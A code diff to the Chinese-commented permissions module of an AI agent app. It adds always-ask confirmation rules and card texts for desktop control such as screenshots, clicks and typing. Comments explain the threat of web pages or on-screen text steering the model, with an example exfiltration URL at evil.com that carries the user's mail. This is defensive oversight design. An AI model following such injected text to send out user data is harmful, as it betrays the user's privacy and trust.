@@ -27,6 +27,10 @@
   浏览器：点击提交表单的按钮        先问用户（也包括名字像"购买""支付""发送""删除"的按钮）。点普通的链接、按钮不问
   浏览器：输入文字、填表单          先问用户，把要输入的内容给你看
   浏览器：往密码框、银行卡输入      每次都问，在任何模式下，卡片上带着警告
+  操作整台电脑：截图、放大          每次都问，在任何模式下。确认卡片上可以选"这段对话里截图不再问"
+  操作整台电脑：点击、拖动、移动鼠标、滚动、打字、按键   每次都问，在任何模式下（"全部自动允许"也不放开）。
+                                    卡片上写着落在哪个程序上；危险的组合键（⌘Q、Ctrl+Alt+Del……）带着警告
+  操作整台电脑：等一等、看鼠标在哪儿   直接执行（什么都不看、什么都不碰）
 
 "先问用户"可以由用户自己放宽（见 MODES）。放宽的只是"问不问"：哪些操作需要确认、
 确认时给用户看什么，仍然由上面这张表决定；保存密钥的 .env 在任何模式下都碰不了。
@@ -40,6 +44,12 @@ MCP 的工具是别人写的程序，它能做什么我们看不到（它说自�
 "打开 evil.com/?data=你的邮件"）。点页面上已有的链接不问：链接是页面自己的，带不走它不知道的东西。
 密码和银行卡永远要你亲眼看一下，哪怕你选了"全部自动允许"：被网页带偏的模型最想要的就是这两样。
 "这段对话里允许过的网站"记在这段对话自己的浏览器上（BrowserSession.allowed_sites），换一段对话就从头再问。
+
+操作整台电脑的规矩为什么最严（见 desktop/__init__.py）：它碰到的是你的整台电脑，屏幕上的任何文字都可能把模型带偏，
+而智狐只看得到像素，没法像浏览器那样替你判断"点下去会不会提交什么"。所以除了"等一等"，每一步都要你亲眼看一下，
+哪一种模式都不放开（auto_allows 一律说"要问"）。唯一能放宽的是截图：只是看、不动，而且模型几乎每一步都要截一张，
+每张都问会把人问烦，问烦了就会不看就点"允许"。这一项记在这段对话自己的 DesktopSession 上，只有你在对话里的确认卡片上点了才打开，
+换一段对话就从头再问；定时任务、聊天通道里没有这个选项。
 
 定时任务自己运行的时候（多半没人看着），用的是这个任务自己的那一档（见 unattended），和对话里选的哪一档无关：
 用户在对话里放开时，想的是"我看着它做"，不是"它半夜自己做的时候也别问"。每个任务默认"每次都问"，
@@ -58,6 +68,7 @@ from typing import Any
 
 from .browser import urls
 from .browser.session import Facts
+from .desktop.session import Facts as DesktopFacts
 from .i18n import k, t
 from .mcp.bridge import PREFIX as MCP_PREFIX
 from .mcp.bridge import McpTool
@@ -66,6 +77,7 @@ from .tools import files, shell
 from .tools import tasks as task_tools
 from .tools.base import ToolError
 from .tools.browser import BrowserTool
+from .tools.computer import DesktopTool
 from .tools.files import FileEditor
 
 # 用户可以选的三种模式，以及给人看的说法。
@@ -107,6 +119,10 @@ class Permissions:
 
     def auto_allows(self, tool_name: str, tool_input: object, tool: object = None) -> bool:
         """一次需要确认的操作，在现在的模式下是不是可以不问就做。tool 是这次要用的那个工具（见 review）。"""
+        if isinstance(tool, DesktopTool):
+            # 操作整台电脑：在任何模式下都要问（见文件开头）。只有截图在你选了"这段对话里截图不再问"之后不问
+            facts = tool.look(tool_input) if isinstance(tool_input, dict) else None
+            return facts is not None and facts.action in LOOKS and facts.trusted
         if isinstance(tool, BrowserTool) and isinstance(tool_input, dict) and _always_ask(tool.look(tool_input)):
             return False  # 往密码框、银行卡里输入，打开不是网页的地址：在任何模式下都要问（见文件开头）
         if self.mode == "all":
@@ -162,6 +178,8 @@ class Permissions:
             return t("调用 MCP 服务器“{server}”的工具 {tool}，参数是：\n\n{args}", server=found[0] or "?", tool=found[1], args=_preview(shown, 40))
         if isinstance(tool, BrowserTool):
             return review_browser(tool.look(tool_input))
+        if isinstance(tool, DesktopTool):
+            return review_computer(tool.look(tool_input))
         if tool_name == shell.TOOL_NAME:
             return t("执行命令：\n\n    $ {command}", command=tool_input.get("command"))
         if tool_name == files.TOOL_NAME:
@@ -351,6 +369,87 @@ def review_browser(facts: Facts) -> str | None:
             return t("在网页上按回车，会按下“{name}”（{role}），可能会提交表单。\n\n  网页：{page}", name=facts.name or "?", role=_role(facts), page=_page(facts))
         return None
     return None
+
+
+# ---- 操作整台电脑 --------------------------------------------------------------
+
+LOOKS = ("screenshot", "zoom")  # 只是看的动作：可以选"这段对话里不再问"
+_CLICKS = {("left", 1): k("左键单击"), ("left", 2): k("左键双击"), ("left", 3): k("左键连点三下"), ("right", 1): k("右键单击"), ("middle", 1): k("中键单击")}
+_DIRECTIONS = {"up": k("向上"), "down": k("向下"), "left": k("向左"), "right": k("向右")}
+
+
+def offering(question: str, offer: str) -> str:
+    """一个问题，确认卡片上多给一个选择（offer 是固定的几个词之一，页面按它画按钮，见 webui/ui.py 的 confirm）。
+    问题本身是 t() 给的一句话（带着原文，页面换语言时能重译），选择记在它身上，不改它的文字。"""
+    question.offer = offer  # type: ignore[attr-defined]
+    return question
+
+
+def always(question: str) -> str:
+    """一个在任何模式下都要问的问题：页面上就不放"不想每次都问？"的入口（换哪一档都不会少问这一次）。"""
+    question.always = True  # type: ignore[attr-defined]
+    return question
+
+
+def _spot(facts: DesktopFacts, point: tuple[int, int] | None = None) -> str:
+    """一个位置，给人看的说法：截图上的坐标；屏幕上的点不一样的话（缩小过、Retina）也写上。"""
+    point = point if point is not None else facts.point
+    if point is None:
+        return t("鼠标现在的位置")
+    if facts.on_screen is not None and facts.on_screen != tuple(point) and point is facts.point:
+        return t("({x}, {y})（屏幕上的 ({sx}, {sy})）", x=point[0], y=point[1], sx=facts.on_screen[0], sy=facts.on_screen[1])
+    return f"({point[0]}, {point[1]})"
+
+
+def _app(facts: DesktopFacts) -> str:
+    return facts.app or t("（看不出是哪个程序）")
+
+
+def review_computer(facts: DesktopFacts) -> str | None:
+    """操作整台电脑的一次动作怎么问你（规矩见文件开头）。返回要显示的说明；不用问（根本不会做、或者什么都不碰）返回 None。
+    问题都标着 always：换哪一档模式都照样要问。"""
+    question = _review_computer(facts)
+    return always(question) if question is not None else None
+
+
+def _review_computer(facts: DesktopFacts) -> str | None:
+    action = facts.action
+    if not facts.ready or facts.bad or facts.blocked or action in ("wait", "cursor"):
+        return None  # 关着、用不了、参数不对、碰到不许碰的程序：工具会直接回答，什么都不会做。等一等、看鼠标在哪儿：什么都不碰
+    front = t("\n  最前面的程序：{app}", app=_app(facts))
+    if action == "screenshot":
+        question = t("截一张整个屏幕的图交给模型。屏幕上的一切它都看得到：别的程序、通知里的消息、打开着的文件。{front}", front=front)
+        return offering(question, "screenshots")
+    if action == "zoom":
+        region = ", ".join(str(value) for value in facts.region)
+        return offering(t("把屏幕上的一块（[{region}]）放大了交给模型看。{front}", region=region, front=front), "screenshots")
+    held = t("\n  同时按着：{keys}", keys="+".join(facts.modifiers)) if facts.modifiers else ""
+    on = t("\n  落在：{app} 的窗口上", app=_app(facts))
+    if action == "click":
+        what = t(_CLICKS.get((facts.button, facts.count if facts.button == "left" else 1), _CLICKS[("left", 1)]))
+        return t("在电脑上点击鼠标（{what}）：{where}{on}{held}", what=what, where=_spot(facts), on=on, held=held)
+    if action == "drag":
+        return t("在电脑上按住鼠标左键拖动：从 {start} 到 {end}{on}{held}", start=_spot(facts), end=_spot(facts, facts.end), on=on, held=held)
+    if action == "move":
+        return t("把鼠标移到 {where}{on}", where=_spot(facts), on=on)
+    if action == "press":
+        return t("在 {where} 按下鼠标左键（先不松开，接下来通常是拖动）{on}", where=_spot(facts), on=on)
+    if action == "release":
+        return t("在 {where} 松开鼠标左键{on}", where=_spot(facts), on=on)
+    if action == "scroll":
+        return t("在电脑上滚动：{where}，{direction} {amount} 格{on}{held}", where=_spot(facts), direction=t(_DIRECTIONS.get(facts.direction, facts.direction)), amount=facts.amount, on=on, held=held)
+    # 填进去的每一段都保持是 t() 给的一句话（不和别的字拼起来），页面换语言时才能连里面的一起重译（见 i18n.Message）
+    warning = t("\n\n{warning}", warning=t(facts.danger)) if facts.danger else ""
+    target = t("\n  打到：{app}（智狐会先把它换回最前面）", app=_app(facts))
+    if action == "type":
+        newline = t("\n\n{warning}", warning=t("⚠ 内容里有换行：在很多程序里，换行就是按回车（发送、提交）。")) if facts.newline else ""
+        return t("在电脑上打字：{target}\n  内容：\n{content}{newline}", target=target, content=_preview(facts.text, 8), newline=newline)
+    if action == "key":
+        times = t("（{n} 次）", n=facts.repeat) if facts.repeat > 1 else ""
+        return t("在电脑上按键：{keys}{times}{target}{warning}", keys=facts.text, times=times, target=target, warning=warning)
+    if action == "hold":
+        return t("在电脑上按住 {keys} {seconds} 秒{target}{warning}", keys=facts.text, seconds=f"{facts.duration:g}", target=target, warning=warning)
+    return t("在电脑上做一个动作：{action}{front}", action=action, front=front)
 
 
 def _preview(text: object, max_lines: int = 12) -> str:
